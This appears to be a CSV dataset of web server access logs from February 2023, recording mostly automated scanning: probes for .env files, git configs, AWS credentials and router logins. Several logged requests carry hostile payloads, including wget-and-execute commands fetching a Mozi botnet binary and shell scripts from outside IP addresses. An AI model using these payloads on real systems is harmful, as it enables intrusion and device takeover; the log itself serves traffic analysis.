Host,Date,Time,Method,Endpoint,Protocol,Status Code,Content Size,No of Requests
2256170697,17-Feb-23,14:00:51,0,"""-""","""-",6,157,20
2256170697,17-Feb-23,14:00:51,4,/info.php,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/s/2313e2235313e2933313e24313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/.DS_Store,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/server-status,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/?rest_route=/wp/v2/users/,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/.git/config,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/.env,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/.vscode/sftp.json,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/debug/default/view?panel=config,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/telescope/requests,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/login.action,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/about,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/api/search?folderIds=0,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/config.json,HTTP/1.1,3,169,20
2256170697,17-Feb-23,14:00:51,4,/v2/_catalog,HTTP/1.1,3,169,20
2556019923,17-Feb-23,14:01:15,4,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,3,169,84
731450077,17-Feb-23,14:14:59,4,/,HTTP/1.1,3,169,1
3515691998,17-Feb-23,14:20:56,4,/,HTTP/1.1,3,169,4
3515691998,17-Feb-23,14:20:58,4,/favicon.ico,HTTP/1.1,3,169,4
3451484485,17-Feb-23,14:21:07,4,/,HTTP/1.1,3,169,2
3451484485,17-Feb-23,14:21:09,4,/favicon.ico,HTTP/1.1,3,169,2
457695348,17-Feb-23,14:30:32,0,"""-""","""-",6,157,2
623701735,17-Feb-23,15:19:57,7,/boaform/admin/formLogin,HTTP/1.1,3,169,20
623701735,17-Feb-23,15:19:57,0,"""-""","""-",6,0,20
2556019923,17-Feb-23,15:23:09,4,/actuator/gateway/routes,HTTP/1.1,3,169,84
2148437282,17-Feb-23,15:25:59,4,/,HTTP/1.1,3,169,7
3005985266,17-Feb-23,16:17:37,7,/boaform/admin/formLogin,HTTP/1.1,3,169,35
3005985266,17-Feb-23,16:17:37,0,"""-""","""-",6,0,35
3245341406,17-Feb-23,16:51:51,4,/,HTTP/1.1,3,169,12
3005985266,17-Feb-23,17:00:44,4,/,HTTP/1.1,3,169,35
3119963234,17-Feb-23,17:01:50,7,/boaform/admin/formLogin,HTTP/1.1,3,169,45
3119963234,17-Feb-23,17:01:50,0,"""-""","""-",6,0,45
3245341406,17-Feb-23,17:15:59,4,/,HTTP/1.1,3,169,12
2745988486,17-Feb-23,17:18:59,4,/,HTTP/1.1,3,169,12
2745988486,17-Feb-23,17:19:05,4,/HNAP1,HTTP/1.1,3,169,12
2745988486,17-Feb-23,17:19:12,7,/onvif/device_service,HTTP/1.1,3,169,12
2745988486,17-Feb-23,17:19:14,4,/PSIA/index,HTTP/1.1,3,169,12
1844273588,17-Feb-23,17:21:50,4,/.env,HTTP/1.1,3,169,73
1844273588,17-Feb-23,17:21:50,66,\x84\xD3\xE4\xDC\x12\x19\x9D\xE5\xB6\x9C+4\x14\xEA\x95\x9C\x0F#\xB3\x01\xDD5\xF7,"\xE7qG\xD3\x8C\xBFfD\xE2C\xBD+-\xCD6\x99(\x1D:Q>\xC96\xA0\x1B\x84\xABq\xAB1\xAAH\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0",6,157,73
1844273588,17-Feb-23,17:21:51,7,/.env,HTTP/1.1,3,169,73
1844273588,17-Feb-23,17:21:51,4,/.aws/credentials,HTTP/1.1,3,169,73
3280283664,17-Feb-23,17:48:42,4,/,HTTP/1.1,3,169,14
3115618186,17-Feb-23,18:23:58,4,/cgi-bin/authLogin.cgi,HTTP/1.1,3,169,5
3119963234,17-Feb-23,18:44:23,4,/,HTTP/1.1,3,169,45
3240141471,17-Feb-23,18:51:39,4,/,HTTP/1.1,3,169,80
3231406812,17-Feb-23,19:10:56,0,"""-""","""-",6,157,1
3245341406,17-Feb-23,19:17:52,7,/boaform/admin/formLogin,HTTP/1.1,3,169,12
3245341406,17-Feb-23,19:17:52,0,"""-""","""-",6,0,12
2342683262,17-Feb-23,19:19:56,4,/,HTTP/1.0,3,169,1
2343678551,17-Feb-23,19:20:20,4,/,HTTP/1.0,3,169,13
2343678551,17-Feb-23,19:20:20,77,XP|'|'|No|'|'|0.6.4|'|'|..|'|'||'|'|[endof],,6,157,13
2343678551,17-Feb-23,19:20:21,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:21,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:22,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:22,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:22,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:23,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:23,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:23,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:24,0,"""-""","""-",6,157,13
2343678551,17-Feb-23,19:20:24,2,\xB1\xBET\xA4\x9AZ\x9A\xA0?\x90\xE0\xF2t0\x5C\xED\xAE\xACX\x98\xDEJ\xEC\xF2\xC8\x9Cl\xD0\x9C\xC0\xE0\x98\x12\x8F\xE7\xCB\x8F\xA1\xA3\x16\xF1J\xA9<\xBD\xDA`,,6,157,13
2343678551,17-Feb-23,19:20:24,0,"""-""","""-",6,157,13
2160545120,17-Feb-23,19:23:18,4,/,HTTP/1.0,3,169,4
3240141471,17-Feb-23,19:25:56,4,/,HTTP/1.1,3,169,80
3079201056,17-Feb-23,19:50:25,4,/,HTTP/1.1,3,169,198
3079201056,17-Feb-23,19:53:13,4,/,HTTP/1.1,3,169,198
3079201056,17-Feb-23,19:53:33,4,/assets/img/favicon.png,HTTP/1.1,3,169,198
3079201056,17-Feb-23,19:53:52,4,/robots.txt,HTTP/1.1,3,169,198
2892530456,17-Feb-23,19:56:04,4,/gate.php,HTTP/1.1,3,169,2
761244014,17-Feb-23,20:20:16,7,/boaform/admin/formLogin,HTTP/1.1,3,169,4
761244014,17-Feb-23,20:20:16,0,"""-""","""-",6,0,4
2987772976,17-Feb-23,21:00:14,4,/,HTTP/1.1,3,169,1
395505914,17-Feb-23,21:02:58,4,/,HTTP/1.1,3,169,6
2892582353,17-Feb-23,21:05:52,0,"""-""","""-",6,157,1
759020769,17-Feb-23,21:07:21,4,/,HTTP/1.1,3,169,3
3515691158,17-Feb-23,21:25:09,7,/boaform/admin/formLogin,HTTP/1.1,3,169,30
3515691158,17-Feb-23,21:25:10,0,"""-""","""-",6,0,30
3240132585,17-Feb-23,21:46:44,4,/,HTTP/1.1,3,169,5
737595394,17-Feb-23,22:13:09,4,/,HTTP/1.1,3,169,4
2552293848,17-Feb-23,22:13:46,4,/,HTTP/1.1,3,169,2
2552293848,17-Feb-23,22:13:48,35,"RM\xA3\xE9\x11\xAF\x01\xFFl\x92\xA2k-\x14\x94\xBD\xEEO\x07\x0C]\xD0^\x11<\xB3\x90W{6\xEA\x8C\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,6,157,2
761244014,17-Feb-23,22:29:45,7,/boaform/admin/formLogin,HTTP/1.1,3,169,4
761244014,17-Feb-23,22:29:45,0,"""-""","""-",6,0,4
3114404476,17-Feb-23,22:48:52,7,/boaform/admin/formLogin,HTTP/1.1,3,169,2
3114404476,17-Feb-23,22:48:52,0,"""-""","""-",6,0,2
1730876196,17-Feb-23,23:09:10,4,/,HTTP/1.1,3,169,4
881987985,17-Feb-23,23:42:33,4,/.ebextensions/,HTTP/1.1,3,169,1
829767132,17-Feb-23,23:46:46,4,/,HTTP/1.1,3,169,1
3240141471,18-Feb-23,00:01:19,4,/,HTTP/1.1,3,169,80
3245341406,18-Feb-23,00:10:32,7,/boaform/admin/formLogin,HTTP/1.1,3,169,12
3245341406,18-Feb-23,00:10:32,0,"""-""","""-",6,0,12
1551247186,18-Feb-23,00:31:33,4,/,HTTP/1.1,3,169,16
1783320806,18-Feb-23,00:32:35,4,/,HTTP/1.1,3,169,21
1088629031,18-Feb-23,01:03:24,4,/aaa9,HTTP/1.1,3,169,6
1088629031,18-Feb-23,01:03:25,63,\xD6\x84oT\x98\x99\x88$\xE8\xCF\xB1\xB1p\x9F6{\x0Fb\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0,,6,157,6
1088629031,18-Feb-23,01:03:25,4,/aab8,HTTP/1.1,3,169,6
1088629031,18-Feb-23,01:03:26,0,"""-""","""-",6,157,6
3245341406,18-Feb-23,01:28:44,4,/,HTTP/1.1,3,169,12
2059537226,18-Feb-23,01:34:37,4,/shell?cd+/tmp;rm+-rf+*;wget+http://102.33.47.9:47530/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,HTTP/1.1,3,169,1
3240141471,18-Feb-23,01:43:37,4,/,HTTP/1.1,3,169,80
1317032287,18-Feb-23,01:53:17,7,/boaform/admin/formLogin,HTTP/1.1,3,169,2
1317032287,18-Feb-23,01:53:17,0,"""-""","""-",6,0,2
2415145644,18-Feb-23,01:53:52,4,/config/getuser?index=0,HTTP/1.1,3,169,62
2099839471,18-Feb-23,02:33:10,4,/boaform/admin/formLogin?username=adminisp&psd=adminisp,HTTP/1.0,3,169,1
3119963234,18-Feb-23,02:42:49,4,/,HTTP/1.1,3,169,45
3260520401,15-Feb-23,03:36:54,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,03:36:54,0,"""-""","""-",6,0,196
1754805250,15-Feb-23,03:40:39,4,/,HTTP/1.0,3,169,2
2556019923,15-Feb-23,03:49:28,4,/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21,HTTP/1.1,3,169,84
3260520401,15-Feb-23,03:51:25,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,03:51:25,0,"""-""","""-",6,0,196
1332625130,15-Feb-23,03:54:14,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,03:54:15,0,"""-""","""-",6,0,84
3260520401,15-Feb-23,04:09:58,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,04:09:58,0,"""-""","""-",6,0,196
2415145644,15-Feb-23,04:15:24,4,/config/getuser?index=0,HTTP/1.1,3,169,62
1332625130,15-Feb-23,04:23:15,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,04:23:15,0,"""-""","""-",6,0,84
3260520401,15-Feb-23,04:31:05,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,04:31:05,0,"""-""","""-",6,0,196
3240141471,15-Feb-23,04:34:28,4,/,HTTP/1.1,3,169,80
1332625130,15-Feb-23,04:43:21,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,04:43:21,0,"""-""","""-",6,0,84
1021395073,15-Feb-23,04:43:59,4,/login.cgi?cli=aa%20aa%27;wget%20http://1.116.115.169/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$,HTTP/1.1,6,157,1
3260520401,15-Feb-23,04:44:18,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,04:44:19,0,"""-""","""-",6,0,196
2556019923,15-Feb-23,04:48:05,4,/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,HTTP/1.1,3,169,84
2319769669,15-Feb-23,04:48:41,4,/manager/html,HTTP/1.1,3,169,3
2556019923,15-Feb-23,04:49:43,4,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,3,169,84
1332625130,15-Feb-23,05:12:09,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,05:12:09,0,"""-""","""-",6,0,84
600005986,15-Feb-23,05:19:16,4,/,HTTP/1.1,3,169,5
1123077410,15-Feb-23,05:23:52,0,"""-""","""-",6,157,6
3260520401,15-Feb-23,05:27:40,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,05:27:40,0,"""-""","""-",6,0,196
1332625130,15-Feb-23,05:32:04,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,05:32:04,0,"""-""","""-",6,0,84
3119963234,15-Feb-23,05:37:05,4,/,HTTP/1.1,3,169,45
3260520401,15-Feb-23,05:37:29,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,05:37:29,0,"""-""","""-",6,0,196
3237080342,15-Feb-23,05:44:50,0,"""-""","""-",6,157,1
3260520401,15-Feb-23,05:45:55,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,05:45:55,0,"""-""","""-",6,0,196
340046977,15-Feb-23,05:48:40,4,/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:41,4,/core/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:41,4,/web/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:41,4,/app/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:42,4,/laravel/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:42,4,/crm/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:42,4,/backend/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:43,4,/local/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:43,4,/application/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:43,4,/admin/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:44,4,/prod/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:44,4,/api/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:44,4,/.env.php,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:45,4,/sites/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:45,4,/site/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:45,4,/download/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:46,4,/shared/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:46,4,/.env.dev,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:46,4,/blogs/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:47,4,/client/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:47,4,/docs/.env,HTTP/1.1,3,169,74
340046977,15-Feb-23,05:48:47,4,/main/.env,HTTP/1.1,3,169,74
2556019923,15-Feb-23,05:51:01,4,/console/,HTTP/1.1,3,169,84
1332625130,15-Feb-23,05:59:24,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,05:59:24,0,"""-""","""-",6,0,84
3260520401,15-Feb-23,06:00:00,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:00:00,0,"""-""","""-",6,0,196
3260520401,15-Feb-23,06:05:30,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:05:30,0,"""-""","""-",6,0,196
3240141471,15-Feb-23,06:09:42,4,/,HTTP/1.1,3,169,80
2552278179,15-Feb-23,06:11:17,75,\x07.\xB4\x174^\xF8\x04\xB8\xF1,,6,157,18
2552278179,15-Feb-23,06:11:29,4,/,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:06,4,/assets/img/favicon.png,HTTP/1.1,3,169,18
2556019923,15-Feb-23,06:12:11,7,/Autodiscover/Autodiscover.xml,HTTP/1.1,3,169,84
2552278179,15-Feb-23,06:12:16,4,/robots.txt,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:31,4,/sitemap.xml,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:43,4,/js/multipage.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:44,4,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:44,4,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:44,4,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:44,4,/js/jquery.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:47,4,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:47,4,/assets/js/main.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:47,4,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,3,169,18
2552278179,15-Feb-23,06:12:47,4,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,3,169,18
3260520401,15-Feb-23,06:15:37,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:15:38,0,"""-""","""-",6,0,196
3247346197,15-Feb-23,06:20:08,0,"""-""","""-",6,157,1
3260520401,15-Feb-23,06:25:55,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:25:55,0,"""-""","""-",6,0,196
1332625130,15-Feb-23,06:26:23,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,06:26:23,0,"""-""","""-",6,0,84
3260520401,15-Feb-23,06:31:37,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:31:37,0,"""-""","""-",6,0,196
2415145644,15-Feb-23,06:33:35,4,/config/getuser?index=0,HTTP/1.1,3,169,62
2556019923,15-Feb-23,06:44:44,4,/_ignition/execute-solution,HTTP/1.1,3,169,84
3260520401,15-Feb-23,06:46:16,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:46:16,0,"""-""","""-",6,0,196
977782643,15-Feb-23,06:48:38,4,/,HTTP/1.1,3,169,1
1332625130,15-Feb-23,06:52:20,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,06:52:20,0,"""-""","""-",6,0,84
3260520401,15-Feb-23,06:53:12,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,06:53:12,0,"""-""","""-",6,0,196
3240301219,15-Feb-23,06:59:17,4,/shell?cd+/tmp;+wget+193.35.18.163/html.sh;+wget+193.35.18.163/html.sh;+wget+193.35.18.163/html.sh;+chmod+777+html.sh;+./html.sh;rm+-rf+html.sh,HTTP/1.1,3,169,1
3260520401,15-Feb-23,07:02:55,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,07:02:56,0,"""-""","""-",6,0,196
2556019923,15-Feb-23,07:06:53,4,/,HTTP/1.1,3,169,84
3260520401,15-Feb-23,07:10:49,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,07:10:49,0,"""-""","""-",6,0,196
1332625130,15-Feb-23,07:11:46,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,07:11:46,0,"""-""","""-",6,0,84
1034267760,15-Feb-23,07:12:35,4,/,HTTP/1.1,3,169,1
3515687697,15-Feb-23,07:15:05,4,/,HTTP/1.1,3,169,5
3260520401,15-Feb-23,07:29:21,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,07:29:21,0,"""-""","""-",6,0,196
3260520401,15-Feb-23,07:36:18,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,07:36:18,0,"""-""","""-",6,0,196
1332625130,15-Feb-23,07:38:20,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,07:38:20,0,"""-""","""-",6,0,84
1519889260,15-Feb-23,07:41:59,3,ip.bablosoft.com:443,HTTP/1.1,6,157,36
1519889260,15-Feb-23,07:42:00,0,"""-""","""-",6,157,36
1519889260,15-Feb-23,07:42:09,4,http://ip.bablosoft.com/?Z72549204420Q1,HTTP/1.1,3,169,36
1519889260,15-Feb-23,07:42:10,0,"""-""","""-",6,157,36
3240141471,15-Feb-23,07:54:01,4,/,HTTP/1.1,3,169,80
534511955,15-Feb-23,07:55:13,4,/,HTTP/1.1,3,169,1
2556019923,15-Feb-23,07:55:20,7,/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh,HTTP/1.1,6,157,84
2364425611,15-Feb-23,08:07:22,4,/.env,HTTP/1.1,3,169,7
2364425611,15-Feb-23,08:07:23,4,/_profiler/phpinfo,HTTP/1.1,3,169,7
2364425611,15-Feb-23,08:07:24,4,/phpinfo,HTTP/1.1,3,169,7
2364425611,15-Feb-23,08:07:24,4,/phpinfo.php,HTTP/1.1,3,169,7
2364425611,15-Feb-23,08:07:25,4,/info.php,HTTP/1.1,3,169,7
2364425611,15-Feb-23,08:07:26,4,/php.php,HTTP/1.1,3,169,7
2364425611,15-Feb-23,08:07:27,4,/test.php,HTTP/1.1,3,169,7
1332625130,15-Feb-23,08:08:19,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,08:08:20,0,"""-""","""-",6,0,84
731829750,15-Feb-23,08:09:00,0,"""-""","""-",6,157,4
731829750,15-Feb-23,08:09:00,78,\xE00\xCC\xBAU]<\x15\x14\xBA\xC7W7c\x02\x98\xC996\x95\x1C\xC5\x164yR\xE7\x8C\x90\x8E\x06\x92w\xCD\xE9\x0E\x14!\x19\x87KE\xE1\x86,",)\xEA\x85_\x16I(\x86\x8B?\xADXx\xD7\xE7\xB67\x83\xF1\xFC;\x83\xC8\x0F\xAE\xDD\x1A\xCA\xBF\xD3\xF0\x98\xAA\xD9=\xD0\xD0\xD6\xEF\xABQZ`\xBCrhc@[\x9Cz\xEA\x8AJ|\x8F\xEF\x86V\x11\xDC\xBB\x5C\xF8T\xF3=\x9B\xAF\x11\xBD8\x96\xAD\xE7e~`ov\xCC\xB6\xCA\xDE\xB78\xDC\xD88w9\x91\x8C\xD1\xDE/\x98\xCA\x8D%\xDC\x85+sb\xAE\xE5&\xCA\x08\x06\xFF\x9Ev\xA5\x96\xED\x0F\xBC\xEA2\xFA\x1F7\x03\xC9g\x83)TF$H\xA8\xD2\xA24\x91\x80\xABg\x0CF+\xBFx*w\x19\x01\x0E\xFF\xCF\x1B\xA8\x9AJrF.\x0B\x9D\x84\xF2\xEE\x80Y\x18\xD4\x12\xFE\x14\x89\x9B\x8C\x9AL6\x17\x09\xF25\x5C\xEDb\x02\x89\xCD\xA7|\xC9zL\x97\x81\x92\x96\xA3\xC4g\xB4(\xE3k\x82Gk\xC1\x90B\xE6][\xE1\x02\x9B\x86?Tua\x1C\xE0\xFC\x9F\x8D\xEB\x01\xAB\xC0\xE5\xD6\x98\xD5\xE0<\x93\xEA\x00\x8DT\xE9\x05\x04y-G\x0E\xC5R\x0E\x18\xF4\xC1\xD6\x8E\xBDi\xBBf\xBC1Z-\xFD\x90N\x16\x81\x07C*mk\x11\xBCZ\x02\x85\x95a\xDE\xAB\xA8\xB7\xA3\xA7;\x19\xDE\xB3\xD7",6,157,4
731829750,15-Feb-23,08:09:00,0,"""-""","""-",6,157,4
731829750,15-Feb-23,08:09:00,0,"""-""","""-",6,157,4
2556019923,15-Feb-23,08:14:49,4,/,HTTP/1.1,3,169,84
1733330673,15-Feb-23,08:21:15,4,/,HTTP/1.1,3,169,1
1733330657,15-Feb-23,08:21:46,4,/,HTTP/1.1,3,169,1
1332625130,15-Feb-23,08:32:27,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,08:32:27,0,"""-""","""-",6,0,84
1519889260,15-Feb-23,08:36:10,3,api.ipify.org:443,HTTP/1.1,6,157,36
1519889260,15-Feb-23,08:36:11,0,"""-""","""-",6,157,36
1519889260,15-Feb-23,08:36:20,4,http://api.ipify.org?Z72549204420Q1,HTTP/1.1,3,169,36
1519889260,15-Feb-23,08:36:21,0,"""-""","""-",6,157,36
2556019923,15-Feb-23,08:43:13,4,/actuator/gateway/routes,HTTP/1.1,3,169,84
3260520401,15-Feb-23,08:46:01,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,08:46:01,0,"""-""","""-",6,0,196
1332625130,15-Feb-23,08:53:21,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,08:53:21,0,"""-""","""-",6,0,84
1332625130,15-Feb-23,09:17:40,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,09:17:41,0,"""-""","""-",6,0,84
3240141471,15-Feb-23,09:19:16,4,/,HTTP/1.1,3,169,80
2105679789,15-Feb-23,09:25:13,0,"""Hello,",world,3,169,1
1519889258,15-Feb-23,09:27:38,3,check.best-proxies.ru:443,HTTP/1.1,6,157,48
1519889258,15-Feb-23,09:27:39,0,"""-""","""-",6,157,48
1519889258,15-Feb-23,09:27:44,4,http://check.best-proxies.ru/ip.php?Z72549204420Q1,HTTP/1.1,3,169,48
1519889258,15-Feb-23,09:27:50,0,"""-""","""-",6,157,48
1297829432,15-Feb-23,09:37:08,0,"""-""","""-",6,157,2
1297829432,15-Feb-23,09:37:08,4,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,3,169,2
2415145644,15-Feb-23,09:46:14,4,/config/getuser?index=0,HTTP/1.1,3,169,62
1332625130,15-Feb-23,09:46:34,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,09:46:34,0,"""-""","""-",6,0,84
3116218090,15-Feb-23,09:49:19,4,/,HTTP/1.1,6,157,4
881983555,15-Feb-23,10:08:56,4,/dist/,HTTP/1.1,3,169,1
1332625130,15-Feb-23,10:12:27,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
1332625130,15-Feb-23,10:12:27,0,"""-""","""-",6,0,84
3260520401,15-Feb-23,10:19:27,7,/boaform/admin/formLogin,HTTP/1.1,3,169,196
3260520401,15-Feb-23,10:19:27,0,"""-""","""-",6,0,196
3515691158,15-Feb-23,10:28:07,7,/boaform/admin/formLogin,HTTP/1.1,3,169,30
3515691158,15-Feb-23,10:28:07,0,"""-""","""-",6,0,30
1519889258,15-Feb-23,10:33:20,3,v4.ident.me:443,HTTP/1.1,6,157,48
1519889258,15-Feb-23,10:33:25,0,"""-""","""-",6,157,48
1519889258,15-Feb-23,10:33:34,4,http://v4.ident.me?Z72549204420Q1,HTTP/1.1,3,169,48
1519889258,15-Feb-23,10:33:35,0,"""-""","""-",6,157,48
1332625130,15-Feb-23,10:34:20,7,/boaform/admin/formLogin,HTTP/1.1,3,169,84
